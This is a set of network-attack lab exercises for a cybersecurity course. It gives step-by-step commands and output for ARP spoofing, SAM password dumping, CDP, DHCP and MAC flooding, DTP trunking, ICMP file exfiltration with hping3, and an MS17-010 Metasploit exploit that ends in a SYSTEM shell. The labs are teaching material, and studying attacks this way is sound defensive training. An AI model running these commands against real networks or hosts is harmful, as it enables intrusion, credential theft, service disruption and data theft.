---
title: Additional Labs for Netacad CyberOps Associate
---

## ARP spoofing (MITM)

1. Goal
    * Intercept the communication between 2 devices in a switched network.

2. Used hardware
    * 1 laptop with Kali Linux
    * 2 devices (Computers, laptops, ...)

3. Used software
    * Kali Linux (2019.4)

4. Setup

![Success](./assets/mitm.png)

5. Getting started
    1. Get an overview of your network. (Kali Linux)
    
    ![Success](./assets/netdiscover_command.png)

    ![Success](./assets/netdiscover_result.png)

    The result shows us the client (192.168.1.1) and the server (192.168.1.2).

    2. Start the communication between the client and the server.

    ![Success](./assets/ping.png)
    
    3. Look at the MAC address table of the client.

    ![Success](./assets/first_arp.png)

    4. Start Wireshark (Kali Linux)

    ![Success](./assets/first_Wireshark.png)

    The result shows us no ICMP traffic destined for the server (192.168.1.2).

    5. Set IP forwarding. (Kali Linux)
    
    IP forwarding allows an operating system to forward packets as a router does or more generally to route them through other networks.
    
    ![Success](./assets/ip_forward.png)

    6. Launch the MITM attack. (Kali Linux)

        1. Start Ettercap.

        ![Success](./assets/Ettercap.png)

        2. Select the correct sniffing method and interface.

        ![Success](./assets/sniffing.png)

        ![Success](./assets/sniffing2.png)

        3. Select  the hosts (via a scan or manually).

        ![Success](./assets/scan.png)

        ![Success](./assets/scan2.png)

        4. Start the attack.

        ![Success](./assets/attack.png)

        ![Success](./assets/attack2.png)

    7. Verify if the attack was succesfull.

    We are now capturing the traffic between the client and the server.

    ![Success](./assets/after_wireshark.png)

    The MAC address table of the client is poisonend. (192.168.1.10 is our Kali)

    ![Success](./assets/last_arp.png)

6. Conclusion
    * A man-in-the-middle attack (MITM) is easy to establish and hard to detect.

## Attack the SAM database

1. Goal
    * Recover the password of a user that uses Microsoft Windows as operating system.
    
2. Used hardware
    * 1 laptop with Kali Linux
    * 1 laptop with Microsoft Windows (user)  

3. Used software
    * Kali Linux (2020.1)
    * Microsoft Windows 10

4. Setup
    
    ![Success](./assets/setup.png)

5. Getting started

    1. Introduction

        The Security Account Manager (SAM) is a database file that stores users' passwords.

        [More information about Security Account Manager](https://en.wikipedia.org/wiki/Security_Account_Manager)

        There are 2 possible strategies:

            * The online attack
            The user didn't log off. So Microsoft Windows is still running.

            * The offline attack
            The hard disk of the user is in your possion.
             

    2. The online attack

        1. Download the tool PwDump8.
        
            [On your own responsibility!](http://blackmath.it/#Download)


        2. Run the tool (requires administrative privileges) on the laptop of the user.

            ![Success](./assets/pwdump.png)

        3. Retrieve the password.

            There are multiple websites available.

            ![Success](./assets/hash.png)
    
    3. The offline attack

        1. Attach the hard disk to Kali laptop.

            ![Success](./assets/disk.png)

        2. Start ophcrack.

            ![Success](./assets/ophcrack.png)
        
        3. Select Load - Encrypted SAM.

            ![Success](./assets/sam.png)
        
        4. Check the result.

            ![Success](./assets/ophcrack2.png)

        5. Retrieve the password.

            There are multiple websites available.

            ![Success](./assets/hash.png)

6. Conclusion
    * Never leave your computer unattended!
        
## CDP flooding

1. Goal
    * To saturate the CPU of a Cisco device.

2. Used hardware
    * 1 laptop with Kali Linux
    * 1 Cisco device

3. Used software
    * Kali Linux (2019.4)

4. Setup
    
    ![Success](./assets/setup3.png)

5. Getting started
    1. Check if CDP (Cisco Discovery Protocol) is enabled on the Cisco device.
    
    [More information about CDP](https://en.wikipedia.org/wiki/Cisco_Discovery_Protocol)
    ```
    Switch#show cdp
    Global CDP information:
        Sending CDP packets every 60 seconds
        Sending a holdtime value of 180 seconds
        Sending CDPv2 advertisements is enabled
    Switch#
    ```
    2. Check the CPU usage of the Cisco device
    ```
    Switch#show processes cpu history

                         11111
          444445555577777444445555577777444445555555555555555555544444
    100
    90
    80
    70
    60
    50
    40
    30
    20
    10      *************************     ********************
         0....5....1....1....2....2....3....3....4....4....5....5....6
                   0    5    0    5    0    5    0    5    0    5    0
                   CPU% per second (last 60 seconds)
    ```
    3. Install Yersinia on Kali Linux (if necessary)
   
    [More information about Yersinia](https://tools.kali.org/vulnerability-analysis/yersinia)
    ```
    root@kali:~# apt-get update
    root@kali:~# apt-get upgrade
    root@kali:~# apt-get install yersinia
    ```
    4. Launching CDP flooding
    ```
    root@kali:~# yersinia -G
    ```
    ![Success](./assets/yersinia.png)

    Select Launch attack -> flooding CDP table

    ![Success](./assets/attack3.png)

    The result of the attack can be seen in the following outputs.
    ```
    Switch#show cdp traffic
    CDP counters :
        Total packets output: 30, Input: 36432
        Hdr syntax: 0, Chksum error: 0, Encaps failed: 0
        No memory: 0, Invalid packet: 0,
        CDP version 1 advertisements output: 5, Input: 36432
        CDP version 2 advertisements output: 25, Input: 0
    Switch#
    ```
    ```
    Switch#show processes cpu history
       999999999999999999999999999999999999999999999999999999999999
       999999999999999999999999999999999999999999999999999999999999
   100 **********************************************************
    90 **********************************************************
    80 **********************************************************
    70 **********************************************************
    60 **********************************************************
    50 **********************************************************
    40 **********************************************************
    30 **********************************************************
    20 **********************************************************
    10 **********************************************************
       0....5....1....1....2....2....3....3....4....4....5....5....6
                 0    5    0    5    0    5    0    5    0    5    0
                 CPU% per second (last 60 seconds)
    ```
6. Conclusion 
    * It is recommended to disable CDP whenever possible.

## Data exfiltration

1. Goal
    * Carry out data from one computer to another computer using ICMP.

2. Used hardware
    * 1 laptop with Kali Linux
    * 1 laptop with Windows 10

3. Used software
    * Kali Linux (2020.1)
    * Wireshark 3.2.3

4. Setup
    
    ![Success](./assets/setup4.png)

5. Getting started

    1. Data exfiltration occurs when malware and/or a malicious actor carries out an unauthorized data transfer from a computer.

    We will use hping3 as an example.
    
    [More information about hping3](https://tools.kali.org/information-gathering/hping3).

    2. Some additional information:
        - IP address Kali: 192.168.1.1/24
        - IP address Windows 10: 192.168.1.2/24
        - Name of the file that will be transferred: WLAN_Commands

    ```
    kali@KALI1:~$ cat ./Desktop/WLAN_Commands 
    Look for the correct WLAN adapter
    sudo airmon-ng

    Kill the nework managers
    sudo airmon-ng check kill

    Put the adapter in monitor mode
    sudo airmon-ng start wlan1

    Start Wireshark
    sudo wireshark

    Select wlan1mon interface!
    kali@KALI1:~$ 
    ```
    3. Check the possibilities of hping3.

    ```
    kali@KALI1:~$ sudo hping3 -h
    usage: hping3 host [options]
    -h  --help      show this help
    -v  --version   show version
    -c  --count     packet count
    -i  --interval  wait (uX for X microseconds, for example -i u1000)
        --fast      alias for -i u10000 (10 packets for second)
        --faster    alias for -i u1000 (100 packets for second)
        --flood      sent packets as fast as possible. Don't show replies.
    -n  --numeric   numeric output
    -q  --quiet     quiet
    -I  --interface interface name (otherwise default routing interface)
    -V  --verbose   verbose mode
    -D  --debug     debugging info
    -z  --bind      bind ctrl+z to ttl           (default to dst port)
    -Z  --unbind    unbind ctrl+z
        --beep      beep for every matching packet received
    Mode
    default mode     TCP
    -0  --rawip      RAW IP mode
    -1  --icmp       ICMP mode
    -2  --udp        UDP mode
    -8  --scan       SCAN mode.
                    Example: hping --scan 1-30,70-90 -S www.target.host
    -9  --listen     listen mode
    IP
    -a  --spoof      spoof source address
    --rand-dest      random destionation address mode. see the man.
    --rand-source    random source address mode. see the man.
    -t  --ttl        ttl (default 64)
    -N  --id         id (default random)
    -W  --winid      use win* id byte ordering
    -r  --rel        relativize id field          (to estimate host traffic)
    -f  --frag       split packets in more frag.  (may pass weak acl)
    -x  --morefrag   set more fragments flag
    -y  --dontfrag   set don't fragment flag
    -g  --fragoff    set the fragment offset
    -m  --mtu        set virtual mtu, implies --frag if packet size > mtu
    -o  --tos        type of service (default 0x00), try --tos help
    -G  --rroute     includes RECORD_ROUTE option and display the route buffer
    --lsrr           loose source routing and record route
    --ssrr           strict source routing and record route
    -H  --ipproto    set the IP protocol field, only in RAW IP mode
    ICMP
    -C  --icmptype   icmp type (default echo request)
    -K  --icmpcode   icmp code (default 0)
        --force-icmp send all icmp types (default send only supported types)
        --icmp-gw    set gateway address for ICMP redirect (default 0.0.0.0)
        --icmp-ts    Alias for --icmp --icmptype 13 (ICMP timestamp)
        --icmp-addr  Alias for --icmp --icmptype 17 (ICMP address subnet mask)
        --icmp-help  display help for others icmp options
    UDP/TCP
    -s  --baseport   base source port             (default random)
    -p  --destport   [+][+]<port> destination port(default 0) ctrl+z inc/dec
    -k  --keep       keep still source port
    -w  --win        winsize (default 64)
    -O  --tcpoff     set fake tcp data offset     (instead of tcphdrlen / 4)
    -Q  --seqnum     shows only tcp sequence number
    -b  --badcksum   (try to) send packets with a bad IP checksum
                    many systems will fix the IP checksum sending the packet
                    so you'll get bad UDP/TCP checksum instead.
    -M  --setseq     set TCP sequence number
    -L  --setack     set TCP ack
    -F  --fin        set FIN flag
    -S  --syn        set SYN flag
    -R  --rst        set RST flag
    -P  --push       set PUSH flag
    -A  --ack        set ACK flag
    -U  --urg        set URG flag
    -X  --xmas       set X unused flag (0x40)
    -Y  --ymas       set Y unused flag (0x80)
    --tcpexitcode    use last tcp->th_flags as exit code
    --tcp-mss        enable the TCP MSS option with the given value
    --tcp-timestamp  enable the TCP timestamp option to guess the HZ/uptime
    Common
    -d  --data       data size                    (default is 0)
    -E  --file       data from file
    -e  --sign       add 'signature'
    -j  --dump       dump packets in hex
    -J  --print      dump printable characters
    -B  --safe       enable 'safe' protocol
    -u  --end        tell you when --file reached EOF and prevent rewind
    -T  --traceroute traceroute mode              (implies --bind and --ttl 1)
    --tr-stop        Exit when receive the first not ICMP in traceroute mode
    --tr-keep-ttl    Keep the source TTL fixed, useful to monitor just one hop
    --tr-no-rtt       Don't calculate/show RTT information in traceroute mode
    ARS packet description (new, unstable)
    --apd-send       Send the packet described with APD (see docs/APD.txt)
    kali@KALI1:~$
    ``` 

    4. Start the capture at the Windows 10 laptop. (Wireshark)
    
    5. Start the communication between the two devices.

    ```
    kali@KALI1:~$ sudo hping3 -E ./Desktop/WLAN_Commands -1 -u -d 250 -c 1 192.168.1.2
    HPING 192.168.1.2 (eth0 192.168.1.2): icmp mode set, 28 headers + 250 data bytes
    [main] memlockall(): Operation not supported
    Warning: can't disable memory paging!
    EOF reached, wait some second than press ctrl+c
    len=278 ip=192.168.1.2 ttl=128 id=31449 icmp_seq=0 rtt=7.6 ms

    --- 192.168.1.2 hping statistic ---
    1 packets transmitted, 1 packets received, 0% packet loss
    round-trip min/avg/max = 7.6/7.6/7.6 ms
    kali@KALI1:~$
    ``` 

    6. Check Wireshark

    ![Success](./assets/hping3.png)

6. Conclusion

    *  Take preventive and detective measures against data exfiltration.

## DHCP starvation

1. Goal
    * Exhausting all available IP addresses that can be allocated by the DHCP server.
     
2. Used hardware
    * 1 laptop with Kali Linux
    * 1 DHCP server (Can also be a router)

3. Used software
    * Kali Linux (2019.4)

4. Setup
    
    ![Success](./assets/setup5.png)

5. Getting started
    
    1. Install Yersinia on Kali Linux (if necessary)
   
    [More information about Yersinia](https://tools.kali.org/vulnerability-analysis/yersinia)
    ```
    root@kali:~# apt-get update
    root@kali:~# apt-get upgrade
    root@kali:~# apt-get install yersinia
    ```

    2. Check the statistics of the DHCP server (DHCP Server).

    We will use Windows Powershell to complete this task.
        
    ```powershell
    Get-DhcpServer4Statistics

    ServerStartTime           : 25/01/2020 21:49:33
    TotalScopes               : 1
    ScopesWithDelayConfigured : 0
    ScopesWithDelayOffers     : 
    TotalAddresses            : 101
    AddressesInUse            : 3
    AddressesAvailable        : 98
    PercentageInUse           : 2,970297
    PercentagePendingOffers   : 0
    PercentageAvailable       : 97,0297
    Discovers                 : 0
    Offers                    : 0
    PendingOffers             : 0
    DelayedOffers             : 0
    Requests                  : 0
    Acks                      : 0
    Naks                      : 0
    Declines                  : 0
    Releases                  : 0
    ```
    
    3. Start Yersinia in Graphical Mode (KALI Linux).

    ```
    root@kali:~# yersinia -G
    ```
    ![Success](./assets/yersinia5.png)

    4. Select Launch Attack and select DHCP.

      ![Success](./assets/dhcp.png)
    
    5. Start the attack and look at the statistics of the DHCP server (DHCP Server).
    
    ```powershell
    Get-DhcpServer4Statistics

    ServerStartTime           : 25/01/2020 22:36:15
    TotalScopes               : 1
    ScopesWithDelayConfigured : 0
    ScopesWithDelayOffers     : 
    TotalAddresses            : 198
    AddressesInUse            : 101
    AddressesAvailable        : 0
    PercentageInUse           : 51,0101
    PercentagePendingOffers   : 48,9899
    PercentageAvailable       : 0
    Discovers                 : 54151
    Offers                    : 98
    PendingOffers             : 97
    DelayedOffers             : 0
    Requests                  : 1
    Acks                      : 1
    Naks                      : 0
    Declines                  : 0
    Releases                  : 0
    ```

6. Conclusion
    * A DHCP starvation attack is easily launched. To mitigate this kind of attack several options are available.   

## DTP attack

1. Goal
    * Getting an access port into trunking mode. (All VLANs are reachable)

2. Used hardware
    * 1 laptop with Kali Linux
    * 1 Cisco device

3. Used software
    * Kali Linux (2020.1)

4. Setup
    
    ![Success](./assets/setup6.png)

5. Getting started

    1. Check if DTP (Dynamic Trunking Protocol) is enabled on the Cisco device.

    ![Success](./assets/dtp1.png)
    
    [More information about DTP](https://en.wikipedia.org/wiki/Dynamic_Trunking_Protocol)
 
    2. Check the status of port on the Cisco switch.

    ```
    Switch#show int gigabitEthernet 0/2 trunk

    Port        Mode             Encapsulation  Status        Native vlan
    Gi0/2       auto             802.1q         not-trunking  1

    Port        Vlans allowed on trunk
    Gi0/2       1

    Port        Vlans allowed and active in management domain
    Gi0/2       1

    Port        Vlans in spanning tree forwarding state and not pruned
    Gi0/2       1
    Switch#
    ```
    3. Install Yersinia on Kali Linux (if necessary)
   
    [More information about Yersinia](https://tools.kali.org/vulnerability-analysis/yersinia)
    
    ```
    kali@kali:~# sudo apt-get update
    kali@kali:~# sudo apt-get upgrade
    kali@kali:~# sudo apt-get install yersinia
    ```
    4. Start Yersinia in Graphical Mode (KALI Linux).

    ```
    kali@kali:~# sudo yersinia -G
    ```
    
    ![Success](./assets/yer2.png)

    5. Select Launch Attack and select DTP

    ![Success](./assets/yer3.png)

    ![Success](./assets/yer4.png)

    6. Check the status of port on the Cisco switch.
    ```
    Switch#show int gigabitEthernet 0/2 trunk

    Port        Mode             Encapsulation  Status        Native vlan
    Gi0/2       auto             802.1q         trunking      1

    Port        Vlans allowed on trunk
    Gi0/2       1-4094

    Port        Vlans allowed and active in management domain
    Gi0/2       1,10,20

    Port        Vlans in spanning tree forwarding state and not pruned
    Gi0/2       1,10,20
    Switch#
    ```
    
6. Conclusion
    * Protect your access ports!

## MAC flooding

1. Goal
    * Changing the behavior of the switch to the behavior of a hub. (Monitoring all traffic)

2. Used hardware
    * 1 laptop with Kali Linux
    * 2 devices (Client & Server)
    * 1 laptop with Wireshark
    * 1 switch

3. Used software
    * Kali Linux (2020.1)
    * Wireshark 3.2.2

4. Setup

    ![Success](./assets/flooding.png)

5. Getting started
    1. Get an overview of your network. (Kali Linux)
    
    ```
    kali@kali:~# sudo netdiscover
    ```

    ```
    Currently scanning: 192.168.20.0/16   |   Screen View: Unique Hosts                                  
                                                                                                      
    2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120                                      
    _____________________________________________________________________________
        IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
    -----------------------------------------------------------------------------
    192.168.1.1     00:24:9b:13:3d:74      1        60  Action Star Enterprise Co., Ltd.                                          
    192.168.1.4     00:21:70:af:62:79      1        60  Dell Inc.   
    ```

    The result shows us the client (192.168.1.1) and the server (192.168.1.4).

    2. Start the communication between the client and the server.

    ```
    C:\Users\Student>ping 192.168.1.4 -t

    Pinging 192.168.1.4 with 32 bytes of data:
    Reply from 192.168.1.4: bytes=32 time<1ms TTL=64
    Reply from 192.168.1.4: bytes=32 time<1ms TTL=64
    Reply from 192.168.1.4: bytes=32 time<1ms TTL=64
    Reply from 192.168.1.4: bytes=32 time<1ms TTL=64
    ```
    
    3. Look at the MAC address table of the client.

    ```
    C:\Users\Student>arp -a

    Interface: 192.168.1.1 --- 0xb
        Internet Address      Physical Address      Type
        192.168.1.4           00-21-70-af-62-79     dynamic   
        192.168.1.255         ff-ff-ff-ff-ff-ff     static    
        224.0.0.22            01-00-5e-00-00-16     static    
        224.0.0.251           01-00-5e-00-00-fb     static    
        224.0.0.252           01-00-5e-00-00-fc     static 
    ```

    4. Start Wireshark. (Kali Linux)

    ![Success](./assets/capture.png)

    The result shows us no ICMP traffic destined for the server (192.168.1.4).

    5. Install macof on Kali Linux. (If necessary)

    ```
    kali@kali:~# sudo apt-get update
    kali@kali:~# sudo apt-get upgrade
    kali@kali:~# sudo apt-get install dsniff
    ```

    6. Check the MAC address table of the switch.

    ```
    Switch#show mac address-table
              Mac Address Table
    -------------------------------------------

    Vlan    Mac Address       Type        Ports
    ----    -----------       --------    -----
    All    0100.0ccc.cccc    STATIC      CPU
    All    0100.0ccc.cccd    STATIC      CPU
    All    0180.c200.0000    STATIC      CPU
    All    0180.c200.0001    STATIC      CPU
    All    0180.c200.0002    STATIC      CPU
    All    0180.c200.0003    STATIC      CPU
    All    0180.c200.0004    STATIC      CPU
    All    0180.c200.0005    STATIC      CPU
    All    0180.c200.0006    STATIC      CPU
    All    0180.c200.0007    STATIC      CPU
    All    0180.c200.0008    STATIC      CPU
    All    0180.c200.0009    STATIC      CPU
    All    0180.c200.000a    STATIC      CPU
    All    0180.c200.000b    STATIC      CPU
    All    0180.c200.000c    STATIC      CPU
    All    0180.c200.000d    STATIC      CPU
    All    0180.c200.000e    STATIC      CPU
    All    0180.c200.000f    STATIC      CPU
    All    0180.c200.0010    STATIC      CPU
    All    ffff.ffff.ffff    STATIC      CPU
      1    0021.70af.6279    DYNAMIC     Gi0/1
      1    0024.9b13.3d74    DYNAMIC     Gi0/4
      1    d067.e556.cac8    DYNAMIC     Gi0/2
      1    ecf4.bb1b.7671    DYNAMIC     Gi0/3
    Total Mac Addresses for this criterion: 24
    Switch#
    ```
    
    6. Launch the attack. (MAC Flooding)

    ```
    kali@kali:~# sudo macof -i eth0
    ```
    
    7. Clear the MAC address table of the switch. (To speed up the result of the attack)

    ```
    Switch#clear mac address-table  
    ```

    8. Stop the attack and check the status of MAC address table.

    ```
    Switch#show mac address-table count

    Mac Entries for Vlan 1:
    ---------------------------
    Dynamic Address Count  : 8170
    Static  Address Count  : 0
    Total Mac Addresses    : 8170

    Total Mac Address Space Available: 0

    Switch# 
    ```
    9. Check Wireshark.

    ![Success](./assets/capture2.png)

    The result shows us ICMP traffic destined for the server (192.168.1.4).

6. Conclusion
    * It is easy to change the behavior of a switch to the behavior of a hub.

## Metasploit framework

1. Goal
    * Getting a brief introduction into the Metasploit Framework.

2. Used hardware
    * 1 laptop with Kali Linux
    * 1 laptop with Windows 7

3. Used software
    * Kali Linux (2020.1)

4. Setup
    
    ![Success](./assets/setup7.png)

5. Getting started

    1. Metasploit framework is the most popular open source tool for pentesting.
    Metasploit framework contains collections of exploits, payloads, and encoders that can be used to identify and exploit vulnerabilities during a pentest project.

    [More information about Metasploit framework](https://github.com/rapid7/metasploit-framework/wiki)
 
    2. Check the IP address of the victim.

    ```
    C:\Users\TEST>ipconfig
    
    Windows IP-configuratie
    
    Ethernet-adapter voor LAN-verbinding:

        Verbindingsspec. DNS-achtervoegsel: lan
        IPv4-adres. . . . . . . . . . . . : 192.168.1.22
        Subnetmasker. . . . . . . . . . . : 255.255.255.0
        Standaardgateway. . . . . . . . . : 192.168.1.1

    C:\Users\TEST>
    ```
    3. Start a port scan using Nmap.(Kali Linux)
   
    [More information about Nmap](https://nmap.org/)
    
    ```
    kali@kali:~# nmap 192.168.1.22
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-09 10:33 CEST
    Nmap scan report for TEST-PC.lan (192.168.1.22)
    Host is up (0.0019s latency).
    Not shown: 990 closed ports
    PORT      STATE SERVICE
    135/tcp   open  msrpc
    139/tcp   open  netbios-ssn
    445/tcp   open  microsoft-ds
    5357/tcp  open  wsdapi
    49152/tcp open  unknown
    49153/tcp open  unknown
    49154/tcp open  unknown
    49155/tcp open  unknown
    49156/tcp open  unknown
    49158/tcp open  unknown

    Nmap done: 1 IP address (1 host up) scanned in 1.87 seconds
    kali@kali:~# 
    ```
    4. Start Metasploit framework.(KALI Linux)

    ![Success](./assets/msf.png)

    ![Success](./assets/msf2.png)

    5. Select an exploit. For instance ms17_010_psexec.

    ```
    msf5 > search ms17_010_psexec

    Matching Modules                                                ================                                                                                                                                                                                                    
    #  Name                                 Disclosure Date  Rank   Check   Description                                 
    -  ----                                 ---------------  ----   -----   -----------
    0  exploit/windows/smb/ms17_010_psexec  2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution

    msf5 > 
    msf5 > use exploit/windows/smb/ms17_010_psexec
    msf5 exploit(windows/smb/ms17_010_psexec) > 

    msf5 exploit(windows/smb/ms17_010_psexec) > info

              Name: MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
            Module: exploit/windows/smb/ms17_010_psexec
          Platform: Windows
              Arch: x86, x64
        Privileged: No
           License: Metasploit Framework License (BSD)
              Rank: Normal
         Disclosed: 2017-03-14

    Provided by:
        sleepya
        zerosum0x0
        Shadow Brokers
        Equation Group

    Available targets:
        Id  Name
        --  ----
        0   Automatic
        1   PowerShell
        2   Native upload
        3   MOF upload

    Check supported:
        Yes

    Basic options:
        Name                  Current Setting                                                 Required  Description
        ----                  ---------------                                                 --------  -----------
        DBGTRACE              false                                                           yes       Show extra debug trace info
        LEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction
        NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)
        NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
        RHOSTS                                                                                yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
        RPORT                 445                                                             yes       The Target port
        SERVICE_DESCRIPTION                                                                   no        Service description to to be used on target for pretty listing
        SERVICE_DISPLAY_NAME                                                                  no        The service display name
        SERVICE_NAME                                                                          no        The service name
        SHARE                 ADMIN$                                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
        SMBDomain             .                                                               no        The Windows domain to use for authentication
        SMBPass                                                                               no        The password for the specified username
        SMBUser                                                                               no        The username to authenticate as

    Payload information:
        Space: 3072

    Description:
        This module will exploit SMB with vulnerabilities in MS17-010 to 
        achieve a write-what-where primitive. This will then be used to 
        overwrite the connection session information with as an 
        Administrator session. From there, the normal psexec payload code 
        execution is done. Exploits a type confusion between Transaction and 
        WriteAndX requests and a race condition in Transaction requests, as 
        seen in the EternalRomance, EternalChampion, and EternalSynergy 
        exploits. This exploit chain is more reliable than the EternalBlue 
        exploit, but requires a named pipe.

    References:
        https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
        https://cvedetails.com/cve/CVE-2017-0143/
        https://cvedetails.com/cve/CVE-2017-0146/
        https://cvedetails.com/cve/CVE-2017-0147/
        https://github.com/worawit/MS17-010
        https://hitcon.org/2017/CMT/slide-files/d2_s2_r0.pdf
        https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/

    Also known as:
        ETERNALSYNERGY
        ETERNALROMANCE
        ETERNALCHAMPION
        ETERNALBLUE

    msf5 exploit(windows/smb/ms17_010_psexec) >
    ``` 
    6. Set some options.
    ```
    msf5 exploit(windows/smb/ms17_010_psexec) > set rhost 192.168.1.22
    rhost => 192.168.1.22
    msf5 exploit(windows/smb/ms17_010_psexec) > set SMBUser TEST
    SMBUser => TEST
    msf5 exploit(windows/smb/ms17_010_psexec) > set SMBPass Easy
    SMBPass => Easy
    ```
    7. Launch the exploit
    ```
    msf5 exploit(windows/smb/ms17_010_psexec) > exploit

    [*] Started reverse TCP handler on 192.168.1.3:4444 
    [*] 192.168.1.22:445 - Authenticating to 192.168.1.22 as user 'TEST'...
    [*] 192.168.1.22:445 - Target OS: Windows 7 Professional 7601 Service Pack 1
    [*] 192.168.1.22:445 - Built a write-what-where primitive...
    [+] 192.168.1.22:445 - Overwrite complete... SYSTEM session obtained!
    [*] 192.168.1.22:445 - Selecting PowerShell target
    [*] 192.168.1.22:445 - Executing the payload...
    [+] 192.168.1.22:445 - Service start timed out, OK if running a command or non-service executable...
    [*] Sending stage (180291 bytes) to 192.168.1.22
    [*] Meterpreter session 1 opened (192.168.1.3:4444 -> 192.168.1.22:49172) at 2020-04-09 13:43:51 +0200

    meterpreter > 
    ```
    8. Display the Meterpreter help menu.
    ```
    meterpreter > help

    Core Commands
    =============

        Command                   Description
        -------                   -----------
        ?                         Help menu
        background                Backgrounds the current session
        bg                        Alias for background
        bgkill                    Kills a background meterpreter script
        bglist                    Lists running background scripts
        bgrun                     Executes a meterpreter script as a background thread
        channel                   Displays information or control active channels
        close                     Closes a channel
        disable_unicode_encoding  Disables encoding of unicode strings
        enable_unicode_encoding   Enables encoding of unicode strings
        exit                      Terminate the meterpreter session
        get_timeouts              Get the current session timeout values
        guid                      Get the session GUID
        help                      Help menu
        info                      Displays information about a Post module
        irb                       Open an interactive Ruby shell on the current session
        load                      Load one or more meterpreter extensions
        machine_id                Get the MSF ID of the machine attached to the session
        migrate                   Migrate the server to another process
        pivot                     Manage pivot listeners
        pry                       Open the Pry debugger on the current session
        quit                      Terminate the meterpreter session
        read                      Reads data from a channel
        resource                  Run the commands stored in a file
        run                       Executes a meterpreter script or Post module
        secure                    (Re)Negotiate TLV packet encryption on the session
        sessions                  Quickly switch to another session
        set_timeouts              Set the current session timeout values
        sleep                     Force Meterpreter to go quiet, then re-establish session.
        transport                 Change the current transport mechanism
        use                       Deprecated alias for "load"
        uuid                      Get the UUID for the current session
        write                     Writes data to a channel


    Stdapi: File system Commands
    ============================

        Command       Description
        -------       -----------
        cat           Read the contents of a file to the screen
        cd            Change directory
        checksum      Retrieve the checksum of a file
        cp            Copy source to destination
        dir           List files (alias for ls)
        download      Download a file or directory
        edit          Edit a file
        getlwd        Print local working directory
        getwd         Print working directory
        lcd           Change local working directory
        lls           List local files
        lpwd          Print local working directory
        ls            List files
        mkdir         Make directory
        mv            Move source to destination
        pwd           Print working directory
        rm            Delete the specified file
        rmdir         Remove directory
        search        Search for files
        show_mount    List all mount points/logical drives
        upload        Upload a file or directory


    Stdapi: Networking Commands
    ===========================

        Command       Description
        -------       -----------
        arp           Display the host ARP cache
        getproxy      Display the current proxy configuration
        ifconfig      Display interfaces
        ipconfig      Display interfaces
        netstat       Display the network connections
        portfwd       Forward a local port to a remote service
        resolve       Resolve a set of host names on the target
        route         View and modify the routing table


    Stdapi: System Commands
    =======================

        Command       Description
        -------       -----------
        clearev       Clear the event log
        drop_token    Relinquishes any active impersonation token.
        execute       Execute a command
        getenv        Get one or more environment variable values
        getpid        Get the current process identifier
        getprivs      Attempt to enable all privileges available to the current process
        getsid        Get the SID of the user that the server is running as
        getuid        Get the user that the server is running as
        kill          Terminate a process
        localtime     Displays the target system's local date and time
        pgrep         Filter processes by name
        pkill         Terminate processes by name
        ps            List running processes
        reboot        Reboots the remote computer
        reg           Modify and interact with the remote registry
        rev2self      Calls RevertToSelf() on the remote machine
        shell         Drop into a system command shell
        shutdown      Shuts down the remote computer
        steal_token   Attempts to steal an impersonation token from the target process
        suspend       Suspends or resumes a list of processes
        sysinfo       Gets information about the remote system, such as OS


    Stdapi: User interface Commands
    ===============================

        Command        Description
        -------        -----------
        enumdesktops   List all accessible desktops and window stations
        getdesktop     Get the current meterpreter desktop
        idletime       Returns the number of seconds the remote user has been idle
        keyboard_send  Send keystrokes
        keyevent       Send key events
        keyscan_dump   Dump the keystroke buffer
        keyscan_start  Start capturing keystrokes
        keyscan_stop   Stop capturing keystrokes
        mouse          Send mouse events
        screenshare    Watch the remote user's desktop in real time
        screenshot     Grab a screenshot of the interactive desktop
        setdesktop     Change the meterpreters current desktop
        uictl          Control some of the user interface components


    Stdapi: Webcam Commands
    =======================

        Command        Description
        -------        -----------
        record_mic     Record audio from the default microphone for X seconds
        webcam_chat    Start a video chat
        webcam_list    List webcams
        webcam_snap    Take a snapshot from the specified webcam
        webcam_stream  Play a video stream from the specified webcam


    Stdapi: Audio Output Commands
    =============================

        Command       Description
        -------       -----------
        play          play an audio file on target system, nothing written on disk


    Priv: Elevate Commands
    ======================

        Command       Description
        -------       -----------
        getsystem     Attempt to elevate your privilege to that of local system.


    Priv: Password database Commands
    ================================

        Command       Description
        -------       -----------
        hashdump      Dumps the contents of the SAM database


    Priv: Timestomp Commands
    ========================

        Command       Description
        -------       -----------
        timestomp     Manipulate file MACE attributes

    meterpreter > 
    ```
    9. Get into a system command shell
    ```
    meterpreter > shell
    Process 2288 created.
    Channel 2 created.
    Microsoft Windows [versie 6.1.7601]
    Copyright (c) 2009 Microsoft Corporation. Alle rechten voorbehouden.

    C:\Windows\system32>


    C:\Windows\system32>whoami
    whoami
    nt authority\system

    C:\Windows\system32>

6. Conclusion
    * Metasploit framework is a solid foundation that you can build upon and easily customize to meet your needs.
    
    [More information about Metasploit framework](https://www.offensive-security.com/metasploit-unleashed/)
